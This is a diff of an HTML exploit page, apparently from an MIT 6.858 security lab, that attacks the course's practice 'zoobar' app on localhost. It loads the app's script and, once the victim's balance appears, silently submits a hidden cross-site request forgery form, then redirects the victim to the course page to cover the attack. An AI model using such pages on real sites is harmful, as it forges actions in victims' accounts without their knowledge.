@@ -64,21 +64,15 @@ xmlHttp.send();
 </form>
 </div>
 <div style="display: none" id="myZoobars"></div>
+<script type="text/javascript"
+        src="http://localhost:8080/zoobar/index.cgi/zoobarjs"></script>
 <script type="text/javascript">
-  var script = document.createElement("script");
-  script.type = "text/javascript";
-  script.src = "http://localhost:8080/zoobar/index.cgi/zoobarjs";
-  document.body.appendChild(script);
   div = document.getElementById("myZoobars");
-  function wait() {
-      if (div.innerHTML != "") {
-        iframe = document.getElementById("iframe");
-        iframe.addEventListener("load", function(){window.location="http://css.csail.mit.edu/6.858/2013/";});
-        document.getElementById("csfr").submit();
-      } else {
-      }
-   }
-  setTimeout(function(){wait()}, 1000);
+  if (div.innerHTML != "") {
+    iframe = document.getElementById("iframe");
+    iframe.addEventListener("load", function(){window.location="http://css.csail.mit.edu/6.858/2013/";});
+    document.getElementById("csfr").submit();
+  }
 </script>
 </body>
 </html>
